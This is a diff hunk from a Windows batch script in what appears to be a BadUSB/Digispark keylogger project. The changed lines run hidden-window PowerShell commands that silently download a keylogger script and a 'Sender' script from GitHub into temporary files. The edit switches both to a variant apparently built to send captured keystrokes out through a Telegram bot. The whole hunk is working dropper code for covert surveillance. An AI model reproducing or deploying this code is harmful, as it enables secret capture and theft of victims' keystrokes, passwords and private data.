@@ -16,12 +16,12 @@ set "killer_path=%temp%\killer.bat"
 
 :: Phase 3: Download required files with error handling (silent mode)
 if not exist "%kl_path%" (
-    powershell -window hidden -command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/abolfazlrashidian/BadUSB/refs/heads/master/Digispark/KeyLogger/KeyLogger.ps1' -OutFile '%kl_path%' -ErrorAction Stop } catch { exit 1 }"
+    powershell -window hidden -command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/0xAbolfazl/BadUSB/refs/heads/master/Digispark/KeyLogger/UsingTelegramBot/KeyLogger.ps1' -OutFile '%kl_path%' -ErrorAction Stop } catch { exit 1 }"
     if errorlevel 1 exit /b 1
 )
 
 if not exist "%sn_path%" (
-    powershell -window hidden -command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/abolfazlrashidian/BadUSB/refs/heads/master/Digispark/KeyLogger/Sender.ps1' -OutFile '%sn_path%' -ErrorAction Stop } catch { exit 1 }"
+    powershell -window hidden -command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/0xAbolfazl/BadUSB/refs/heads/master/Digispark/KeyLogger/UsingTelegramBot/Sender.ps1' -OutFile '%sn_path%' -ErrorAction Stop } catch { exit 1 }"
     if errorlevel 1 exit /b 1
 )
 
